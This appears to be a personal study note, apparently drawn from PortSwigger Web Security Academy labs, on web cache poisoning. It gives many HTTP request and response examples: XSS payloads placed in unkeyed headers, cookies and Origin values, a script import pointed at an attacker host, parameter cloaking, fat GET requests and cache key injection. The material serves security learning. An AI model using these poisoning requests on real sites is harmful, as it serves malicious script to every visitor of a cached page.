[[Cache poisoning]]

# Exploit design flaws
Exploitation web cache poisoning vulnerabilities by manipulating typical unkeyd inputs, such as HTTP headers and cookies.
## [[XSS]]
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public 
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

`X-Forwarded-Host` header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. It's also often unkeyed.
#### Poison example:
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

## Unsafe handling of resource imports
```http
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

## Cookie-handling vulnerabilities
Cookies are not included in the cache key.
Example:
```HTTP
GET / HTTP/2
Host: 0a3a00d8046d91ef80cce42100ef002e.web-security-academy.net
Cookie: fehost=prod-cache-01"}%3balert(1)//; session=QfTJLIM9bSLO6dLu6DjpBGIpdEaMRwEA
```

## Multiple headers
Example:
```http
GET /resources/js/tracking.js HTTP/2
Host: 0aa100d70367a08c80fb535000060064.web-security-academy.net
X-Forwarded-Host: exploit-0a05009b0370a021800b52c9014200a4.exploit-server.net
X-Forwarded-Scheme: http
```
If scheme is http, then redirect to `scheme://host`

## Exploiting responses that expose too much information
### Cache-control directives
Example of cache age disclosure:
```http
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```
### Vary header
`Vary` header specifies a list of additional headers that are part of the cache key.

# Exploit cache implementation flaws
Research: https://portswigger.net/research/web-cache-entanglement

## Cache key flaws
Many websites and CDNs perform various transformations on keyed components when they are saved in the cache key. This can include:
- Excluding the query string
- Filtering out specific query parameters
- Normalizing input in keyed components

## Cache probing methodology

### 1. Identify a suitable cache oracle
A cache oracle is simply a page or endpoint that provides feedback about the cache's behavior. This needs to be cacheable and must indicate whether you received a cached response or not. This feedback might be:
* An HTTP header that explicitly tells you whether you got a cache hit
* Observable changes to dynamic content
* Distinct response times

Ideally, the cache oracle will also reflect the entire URL and query params in the response.

Consult third-party cache docs. For example Akamai supports the header:
```
Pragma: akamai-x-get-cache-key
```
which can be used to display cache key in the response headers.
Request:
```http
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key
```
Response:
```http
HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
```
Another way that could help with getting cache-key:
```
Pragma: x-get-cache-key
```
### 2. Probe key handling
Explore cache key transformations. Common examples are excluding specific query params, or event the entire query string, and removing the port from the `Host` header.

##### Example
The website redirects users to a region-specific page. It uses `Host` to generate `Location` header in the response:

```http
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```
to test whether the port is excluded:
```http
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```
and
```http
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
```
Cache is hit, this proves that the port is being excluded from the cache key.

### 3. Identify an exploitable gadget
Classic gadgets are stored XSS, open redirects.
Instead of having to induce a victim to visit a specially crafted URL, your payload will automatically be served to anybody who visits the ordinary, perfectly legitimate URL.
More interestingly, these techniques enable you to exploit a number of unclassified vulnerabilities that are often dismissed as "unexploitable" and left unpatched. This includes the use of dynamic content in resource files, and exploits requiring malformed requests that a browser would never send.

## Exploiting cache key flaws
### Unkeyed port
For example, consider the case we saw earlier where a redirect URL was dynamically generated based on the `Host` header. This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request.
This kind of attack can be escalated further if the website allows you to specify a non-numeric port. You could use this to inject an XSS payload, for example
### Unkeyed query string
One of the most common cache-key transformations is to exclude the entire query string.
#### Detecting an unkeyed query string
Alternative ways of adding a cache buster, it might be one of the following headers:
```http
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```
If you use Param Miner, you can also select the options "Add static/dynamic cache buster" and "Include cache busters in headers"

For example, the following entries might all be cached separately but treated as equivalent to GET / on the back-end:
* Apache: GET //
* Nginx: GET /%2F
* PHP: GET /index.php/xyz
* .NET GET /(A(xyz)/
This transformation can sometimes mask what would otherwise be glaringly obvious reflected XSS vulnerabilities. If penetration testers or automated scanners only receive cached responses without realizing, it can appear as though there is no reflected XSS on the page.
#### Exploiting an unkeyed query string
Excluding the query string from the cache key can make the payload to be served to users who visit a like normal URL.
#### Exploiting unkeyed query parameters
Usually it is UTM parameters like `utm_content` which don't affect back-end.
#### Cache parameter cloaking
`GET /?example=123?excluded_param=bad-stuff-here`
Back-end server receives one parameter:
```
example = 123?excluded_param=bad-stuff-here
```
Cache server parses two parameters:
```
example = 123
excluded_param = bad-stuff-here
```
#### Exploiting parameter parsing quirks
Back-end identifies distinct params that cache does not.
#Ror  for example interprets both ampersands & and semicolons ; as delimiters.
Example:
```
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```
Cache contains `keyd_param=abc` only and removes `excluded_param`
When RoR splits the query into three params:
1. `keyed_param=abc`
2. `excluded_param=123`
3. `keyed_param=bad-stuff-here`
Since keyd_param is duplicated, RoR take into account the final one.

To exploit this you can control over a function that will be executed.
For example, if a website is using JSONP to make a cross-domain request, this will often contain a `callback` parameter.
```
GET /jsonp?callback=innocentFunction
```
**TLDR**: 
1. identify server whether its RoR or ? symbol can be used twice
2. Find request or static resource with query params supported
#### Exploiting fat GET support
If HTTP method is not in cache key, try to replace HTTP method from GET to POST to poison cache (rarely works).
Add body to GET request with overwritten query params:
```HTTP
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```
If server doesn't accept `GET` requests that have a body, try to overwrite method:
```http
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

#### Exploiting dynamic content in resource imports
Imported resource files are typically static but some reflect input from the query string
Consider a page that reflects the current query string in an import statement:
```http
GET /style.css?excluded_param=123);@import… HTTP/1.1

HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
```
If doctype is not specified, you can maybe even exploit static CSS files by poisoning it triggering a server error that reflects the excluded query parameter:
```http
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
…
This request was blocked due to…alert(1){}*{color:red;}
```

### Normalized cache keys
Some caching implementations normalize keyed input when adding it to the cache key. In this case, both of the following requests would have the same key:
```
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```
When the victim visits the malicious URL, the payload will still be URL-encoded by their browser; however, once the URL is normalized by the cache, it will have the same cache key as the response containing your unencoded payload. 
**TLDR**: poison cache with non URL-encoded link, then send to the victim URL-encoded link.

### Cache key injection
Poison some cache key fragment, then send the link with the same cache key fragment to the victim. Example:
```http
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__

<script>…'-alert(1)-'…</script>
```
Send this link to the victim:
```http
GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
X-Cache: hit

<script>…'-alert(1)-'…</script>
```
#to-be-continued 
lab: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#identify-a-suitable-cache-oracle
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#identify-a-suitable-cache-oracle